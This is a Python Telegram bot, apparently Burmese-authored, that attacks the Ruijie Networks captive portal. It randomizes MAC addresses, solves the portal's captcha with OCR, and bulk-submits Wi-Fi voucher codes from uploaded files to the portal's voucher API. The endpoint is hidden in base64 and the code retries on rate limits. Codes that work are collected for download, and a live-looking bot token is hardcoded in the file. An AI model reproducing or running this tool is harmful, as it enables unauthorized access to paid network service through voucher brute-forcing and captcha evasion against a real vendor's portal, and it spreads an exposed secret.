import telebot
import asyncio
import aiohttp
import base64
import re
import time
import json
import random
import cv2
import numpy as np
import ddddocr
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timezone
import os
import io

BOT_TOKEN = "8983136063:AAESNF_iu11s3PddSrIvHXCOzC-i6K-1wMk"
bot = telebot.TeleBot(BOT_TOKEN)

# User data storage
user_data = {}

# ---------- bbb.py မှ အတိအကျ functions ----------

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id, session):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(
            f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
            headers=headers
        ) as req:
            respond = await req.json()
            profile_name = respond.get('result', {}).get('profileName', 'Unknown')
            totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
            return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        else:
            return None

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        return previous_session_id

async def perform_check(session_url, code):
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as session:
        session_id = await get_session_id(session, session_url, None)
        if not session_id:
            return {"error": "Cannot get session_id"}
        
        auth_code = None
        for _ in range(8):
            try:
                image = await Captcha_Image(session, session_id)
                text = await Captcha_Text(image)
                if not text:
                    continue
                verified = await Varify_Captcha(session, session_id, text)
                if verified:
                    auth_code = text
                    break
            except Exception as e:
                print(f"[perform_check] captcha error: {e}")
        if not auth_code:
            return {"error": "Cannot solve captcha"}
        
        post_url = base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode()
        
        data = {
            "accessCode": code,
            "sessionId": session_id,
            "apiVersion": 1,
            "authCode": auth_code,
        }
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        
        response = None
        for attempt in range(3):
            try:
                async with session.post(post_url, json=data, headers=headers) as req:
                    response_text = await req.text()
                    resp_json = json.loads(response_text)
                    if 'request limited' in response_text:
                        print(f"[perform_check] rate limited, retry {attempt+1}")
                        await asyncio.sleep(1)
                        continue
                    response = resp_json
                    break
            except Exception as e:
                print(f"[perform_check] error: {e}")
                await asyncio.sleep(1)
        
        if response is None:
            return {"error": "No response"}
        
        if 'logonUrl' in response:
            expire_info = await Code_Expires_Date(session_id, session)
            return {"status": "success", "code": code, "expire": expire_info}
        elif 'STA' in response:
            expire_info = await Code_Expires_Date(session_id, session)
            return {"status": "limited", "code": code, "expire": expire_info}
        else:
            return {"status": "failed", "response": response}

# ---------- Wifidog URL အတွက် အထူးပြုလုပ်ထားသော functions ----------

async def get_session_id_from_wifidog(session, wifidog_url):
    """Wifidog URL မှ sessionId ကို redirect မှ ထုတ်ယူသည်"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    try:
        async with session.get(wifidog_url, headers=headers, allow_redirects=True) as resp:
            final_url = str(resp.url)
            # redirect ပြီးနောက် sessionId ပါသော URL ကို ရှာဖွေသည်
            match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', final_url)
            if match:
                return match.group(1), final_url
            # sessionId မပါပါက စာမျက်နှာထဲမှ ရှာဖွေသည်
            html = await resp.text()
            match = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', html)
            if match:
                return match.group(1), final_url
            return None, None
    except Exception as e:
        print(f"Error getting sessionId: {e}")
        return None, None

async def perform_check_wifidog(wifidog_url, code):
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as session:
        # Wifidog URL မှ sessionId ရယူပါ
        session_id, full_url = await get_session_id_from_wifidog(session, wifidog_url)
        if not session_id:
            return {"error": "Cannot get sessionId from wifidog URL"}
        
        # ကျန် perform_check အတိုင်း ဆက်လုပ်ပါ
        auth_code = None
        for _ in range(8):
            try:
                image = await Captcha_Image(session, session_id)
                text = await Captcha_Text(image)
                if not text:
                    continue
                verified = await Varify_Captcha(session, session_id, text)
                if verified:
                    auth_code = text
                    break
            except Exception as e:
                print(f"[perform_check] captcha error: {e}")
        if not auth_code:
            return {"error": "Cannot solve captcha"}
        
        post_url = base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode()
        
        data = {
            "accessCode": code,
            "sessionId": session_id,
            "apiVersion": 1,
            "authCode": auth_code,
        }
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        
        response = None
        for attempt in range(3):
            try:
                async with session.post(post_url, json=data, headers=headers) as req:
                    response_text = await req.text()
                    resp_json = json.loads(response_text)
                    if 'request limited' in response_text:
                        print(f"[perform_check] rate limited, retry {attempt+1}")
                        await asyncio.sleep(1)
                        continue
                    response = resp_json
                    break
            except Exception as e:
                print(f"[perform_check] error: {e}")
                await asyncio.sleep(1)
        
        if response is None:
            return {"error": "No response"}
        
        if 'logonUrl' in response:
            expire_info = await Code_Expires_Date(session_id, session)
            return {"status": "success", "code": code, "expire": expire_info}
        elif 'STA' in response:
            expire_info = await Code_Expires_Date(session_id, session)
            return {"status": "limited", "code": code, "expire": expire_info}
        else:
            return {"status": "failed", "response": response}

async def verify_session_async(session_url):
    try:
        connector = aiohttp.TCPConnector(limit=10, ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as session:
            session_id = await get_session_id(session, session_url, None)
            if not session_id:
                return False
            image = await Captcha_Image(session, session_id)
            return len(image) > 1000
    except:
        return False

async def get_session_id_from_wifidog_async(url):
    connector = aiohttp.TCPConnector(limit=10, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as session:
        return await get_session_id_from_wifidog(session, url)

# ---------- Menu keyboards ----------
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📥 Set Session URL", callback_data="set_session"),
        InlineKeyboardButton("🔍 Check Single Code", callback_data="check_code"),
        InlineKeyboardButton("📁 Check Codes from File", callback_data="check_file"),
        InlineKeyboardButton("📊 Session Info", callback_data="session_info"),
        InlineKeyboardButton("❌ Clear Session", callback_data="clear_session")
    )
    return markup

def back_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu"))
    return markup

# ---------- Callback handlers ----------
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    
    if call.data == "set_session":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "📥 *Session URL သို့မဟုတ် Wifidog URL ကို ထည့်ပါ:*\n\nဥပမာ (session URL):\n`https://portal-as.ruijienetworks.com/...?sessionId=XXXXX&mac=...`\n\nသို့မဟုတ် (wifidog URL):\n`https://portal-as.ruijienetworks.com/api/auth/wifidog?gw_id=...&mac=...`", parse_mode="Markdown", reply_markup=back_menu())
        bot.register_next_step_handler(msg, process_session_url)
    
    elif call.data == "check_code":
        bot.answer_callback_query(call.id)
        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            bot.send_message(chat_id, "❌ *အရင်ဆုံး Session URL ကို သတ်မှတ်ပါ။*", reply_markup=main_menu(), parse_mode="Markdown")
            return
        msg = bot.send_message(chat_id, "🔍 *Voucher Code ကို ထည့်ပါ:*\n\nဥပမာ:\n`686382`", parse_mode="Markdown", reply_markup=back_menu())
        bot.register_next_step_handler(msg, process_check_code)
    
    elif call.data == "check_file":
        bot.answer_callback_query(call.id)
        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            bot.send_message(chat_id, "❌ *အရင်ဆုံး Session URL ကို သတ်မှတ်ပါ။*", reply_markup=main_menu(), parse_mode="Markdown")
            return
        msg = bot.send_message(chat_id, "📁 *code.txt ဖိုင်ကို တစ်ကြောင်းချင်းစီ code များဖြင့် ပို့ပါ။*\n\nဥပမာ:\n```\n686382\n123456\n789012\n```", parse_mode="Markdown", reply_markup=back_menu())
        bot.register_next_step_handler(msg, process_file_check)
    
    elif call.data == "session_info":
        bot.answer_callback_query(call.id)
        if chat_id in user_data and 'session_url' in user_data[chat_id]:
            session_id = user_data[chat_id].get('session_id', 'Unknown')
            url_type = user_data[chat_id].get('url_type', 'session')
            bot.send_message(chat_id, f"📊 *Session Info*\n\nType: {url_type}\nSession ID: `{session_id}`\nURL: `{user_data[chat_id]['session_url'][:80]}...`", reply_markup=main_menu(), parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ Session မရှိသေးပါ။", reply_markup=main_menu())
    
    elif call.data == "clear_session":
        bot.answer_callback_query(call.id)
        if chat_id in user_data:
            user_data.pop(chat_id)
        bot.send_message(chat_id, "✅ Session ကို ဖျက်ပြီးပါပြီ။", reply_markup=main_menu())
    
    elif call.data == "back_menu":
        bot.answer_callback_query(call.id)
        bot.edit_message_text("🤖 *Voucher Checker Bot*\n\nအောက်ပါ menu မှ ရွေးချယ်ပါ။", chat_id, call.message.message_id, reply_markup=main_menu(), parse_mode="Markdown")
    
    elif call.data.startswith("download_"):
        bot.answer_callback_query(call.id)
        if chat_id in user_data and 'success_file' in user_data[chat_id]:
            file_content = user_data[chat_id]['success_file']
            file_bytes = io.BytesIO(file_content.encode('utf-8'))
            file_bytes.name = "success_codes.txt"
            bot.send_document(chat_id, file_bytes, caption="✅ Success Codes ဖိုင်", reply_markup=main_menu())
        else:
            bot.send_message(chat_id, "❌ Success code မရှိပါ။", reply_markup=main_menu())

# ---------- Step handlers ----------
def process_session_url(message):
    chat_id = message.chat.id
    url = message.text.strip()
    
    # sessionId ပါသော URL ဖြစ်စေ၊ wifidog URL ဖြစ်စေ လက်ခံပါ
    if re.search(r'[?&]sessionId=[a-zA-Z0-9]+', url):
        # ပုံမှန် session URL
        status_msg = bot.send_message(chat_id, "⏳ Session အား စစ်ဆေးနေပါသည်...")
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            valid = loop.run_until_complete(verify_session_async(url))
            loop.close()
        except:
            valid = False
        
        if not valid:
            bot.edit_message_text("❌ *Session ID မမှန်ကန်ပါ။*", chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown")
            return
        
        session_id = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', url).group(1)
        user_data[chat_id] = {'session_url': url, 'url_type': 'session', 'session_id': session_id}
        bot.edit_message_text(
            f"✅ *Session သိမ်းဆည်းပြီးပါပြီ။*\n\nSession ID: `{session_id}`",
            chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown"
        )
    
    elif re.search(r'gw_id=|gw_address=|mac=', url):
        # Wifidog URL
        status_msg = bot.send_message(chat_id, "⏳ Wifidog URL အား စစ်ဆေးနေပါသည်...")
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            session_id, full_url = loop.run_until_complete(get_session_id_from_wifidog_async(url))
            loop.close()
        except:
            session_id = None
        
        if not session_id:
            bot.edit_message_text("❌ *Wifidog URL မှ sessionId ရယူ၍မရပါ။*", chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown")
            return
        
        user_data[chat_id] = {'session_url': url, 'url_type': 'wifidog', 'session_id': session_id}
        bot.edit_message_text(
            f"✅ *Wifidog URL သိမ်းဆည်းပြီးပါပြီ။*\n\nSession ID: `{session_id}`",
            chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown"
        )
    else:
        bot.send_message(chat_id, "❌ *မှန်ကန်သော Session URL သို့မဟုတ် Wifidog URL မဟုတ်ပါ။*", reply_markup=main_menu(), parse_mode="Markdown")

def process_check_code(message):
    chat_id = message.chat.id
    code = message.text.strip()
    
    if not code.isdigit() or len(code) < 6:
        bot.send_message(chat_id, "❌ *Code သည် အနည်းဆုံး ၆ လုံးရှိသော ဂဏန်းဖြစ်ရမည်။*", reply_markup=main_menu(), parse_mode="Markdown")
        return
    
    session_url = user_data[chat_id]['session_url']
    url_type = user_data[chat_id].get('url_type', 'session')
    status_msg = bot.send_message(chat_id, "⏳ စစ်ဆေးနေပါသည်... (captcha ဖြေရှင်းခြင်း အပါအဝင်)")
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        if url_type == 'wifidog':
            result = loop.run_until_complete(perform_check_wifidog(session_url, code))
        else:
            result = loop.run_until_complete(perform_check(session_url, code))
        loop.close()
    except Exception as e:
        bot.edit_message_text(f"❌ အမှားဖြစ်သည်: {str(e)}", chat_id, status_msg.message_id, reply_markup=main_menu())
        return
    
    if result.get("status") == "success":
        if 'success_codes' not in user_data[chat_id]:
            user_data[chat_id]['success_codes'] = []
        if code not in user_data[chat_id]['success_codes']:
            user_data[chat_id]['success_codes'].append(code)
        user_data[chat_id]['success_file'] = "\n".join(user_data[chat_id]['success_codes'])
        reply_text = f"✅ *Success*\n\n🎫 `{code}`\n   {result.get('expire', '')}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📥 Download Success Codes", callback_data="download_success.txt"))
        bot.edit_message_text(reply_text, chat_id, status_msg.message_id, reply_markup=markup, parse_mode="Markdown")
    elif result.get("status") == "limited":
        reply_text = f"⚠️ *Limited*\n\n🎫 `{code}`\n   {result.get('expire', '')}"
        bot.edit_message_text(reply_text, chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown")
    elif result.get("status") == "failed":
        reply_text = f"❌ *မအောင်မြင်ပါ*\n\nResponse: `{json.dumps(result.get('response', {}), indent=2)[:300]}`"
        bot.edit_message_text(reply_text, chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown")
    else:
        bot.edit_message_text(f"❌ *Unknown result*\n\n```json\n{json.dumps(result, indent=2)[:300]}\n```", chat_id, status_msg.message_id, reply_markup=main_menu(), parse_mode="Markdown")

def process_file_check(message):
    chat_id = message.chat.id
    
    if message.document is None:
        bot.send_message(chat_id, "❌ *ဖိုင်တစ်ခု ပို့ပါ။* (code.txt ဖိုင်အနေဖြင့်)", reply_markup=main_menu(), parse_mode="Markdown")
        return
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8')
        codes = [line.strip() for line in content.splitlines() if line.strip().isdigit() and len(line.strip()) >= 6]
    except:
        bot.send_message(chat_id, "❌ *ဖိုင်ကို ဖတ်၍မရပါ။* UTF-8 ဖိုင်ဖြစ်ရမည်။", reply_markup=main_menu(), parse_mode="Markdown")
        return
    
    if not codes:
        bot.send_message(chat_id, "❌ *Code များ ရှာမတွေ့ပါ။* တစ်ကြောင်းချင်းစီ ဂဏန်း ၆ လုံးထက်ရှိရမည်။", reply_markup=main_menu(), parse_mode="Markdown")
        return
    
    session_url = user_data[chat_id]['session_url']
    url_type = user_data[chat_id].get('url_type', 'session')
    status_msg = bot.send_message(chat_id, f"⏳ Code {len(codes)} ခုကို စစ်ဆေးနေပါသည်...")
    
    success_codes = []
    limited_codes = []
    failed_codes = []
    
    for idx, code in enumerate(codes):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            if url_type == 'wifidog':
                result = loop.run_until_complete(perform_check_wifidog(session_url, code))
            else:
                result = loop.run_until_complete(perform_check(session_url, code))
            loop.close()
            
            if result.get("status") == "success":
                success_codes.append(f"{code} - {result.get('expire', '')}")
            elif result.get("status") == "limited":
                limited_codes.append(code)
            else:
                failed_codes.append(code)
        except Exception as e:
            failed_codes.append(f"{code} - error")
        
        if (idx + 1) % 3 == 0 or (idx + 1) == len(codes):
            try:
                progress = f"⏳ စစ်ဆေးနေပါသည်... {idx+1}/{len(codes)}\n✅ {len(success_codes)} | ⚠️ {len(limited_codes)} | ❌ {len(failed_codes)}"
                bot.edit_message_text(progress, chat_id, status_msg.message_id)
            except:
                pass
    
    if success_codes:
        user_data[chat_id]['success_codes'] = success_codes
        user_data[chat_id]['success_file'] = "\n".join(success_codes)
    
    reply_parts = []
    if success_codes:
        reply_parts.append(f"✅ *Success ({len(success_codes)})*\n" + "\n".join(success_codes[:20]))
        if len(success_codes) > 20:
            reply_parts.append(f"... ကျန် {len(success_codes)-20} ခု")
    if limited_codes:
        reply_parts.append(f"\n⚠️ *Limited ({len(limited_codes)})*\n" + "\n".join(limited_codes[:10]))
        if len(limited_codes) > 10:
            reply_parts.append(f"... ကျန် {len(limited_codes)-10} ခု")
    if failed_codes:
        reply_parts.append(f"\n❌ *Failed ({len(failed_codes)})*\n" + "\n".join(failed_codes[:10]))
        if len(failed_codes) > 10:
            reply_parts.append(f"... ကျန် {len(failed_codes)-10} ခု")
    
    final_text = "\n".join(reply_parts) if reply_parts else "❌ အားလုံးမအောင်မြင်ပါ။"
    
    if success_codes:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📥 Download Success Codes", callback_data="download_success.txt"))
        if len(final_text) > 4096:
            bot.edit_message_text("📊 *Results - Success codes saved*", chat_id, status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
            for i in range(0, len(final_text), 4096):
                bot.send_message(chat_id, final_text[i:i+4096], parse_mode="Markdown")
        else:
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
    else:
        if len(final_text) > 4096:
            bot.edit_message_text("📊 *Results*", chat_id, status_msg.message_id, parse_mode="Markdown")
            for i in range(0, len(final_text), 4096):
                bot.send_message(chat_id, final_text[i:i+4096], parse_mode="Markdown")
            bot.send_message(chat_id, "✅ *Done*", reply_markup=main_menu(), parse_mode="Markdown")
        else:
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="Markdown", reply_markup=main_menu())

# ---------- Start command ----------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(
        message.chat.id,
        "🤖 *Voucher Checker Bot*\n\nအောက်ပါ menu မှ ရွေးချယ်ပါ။\n\n*URL အမျိုးအစားနှစ်မျိုး လက်ခံပါသည်:*\n1. Session URL (sessionId ပါသော)\n2. Wifidog URL (gw_id, mac ပါသော)",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# ---------- Main ----------
if __name__ == '__main__':
    print("🤖 Bot starting...")
    bot.infinity_polling()